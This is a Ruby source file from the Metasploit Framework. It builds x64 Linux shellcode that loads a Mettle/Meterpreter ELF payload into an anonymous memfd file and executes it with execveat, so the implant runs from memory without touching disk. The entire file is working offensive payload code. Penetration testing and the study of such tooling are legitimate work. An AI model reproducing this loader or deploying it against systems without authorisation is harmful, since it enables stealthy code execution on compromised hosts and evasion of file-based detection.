#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::X64::MeterpreterLoader
  def in_memory_load(payload)
    in_memory_loader_asm = %Q^
    start:
      xor rsi, rsi
      push rsi
      lea rdi, [rsp]
      inc rsi
      mov rax, 0x13F
      syscall                           ; memfd_create("", MFD_CLOEXEC);
      mov rdi, rax
      jmp get_payload
    got_payload:
      pop rsi
      mov rdx, #{payload.length}
      xor rax, rax
      inc rax
      syscall                            ; write(fd, elfbuffer, elfbuffer_len);
    execveat:
      xor rdx, rdx
      xor r10, r10
      xor r8, r8
      mov r8, 0x1000
      push r10
      lea rsi, [rsp]
      mov eax, 0x142
      syscall                           ; execveat(fd,NULL, NULL, NULL);
    get_payload:
      call got_payload
    ^
    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
    in_memory_loader
  end
end
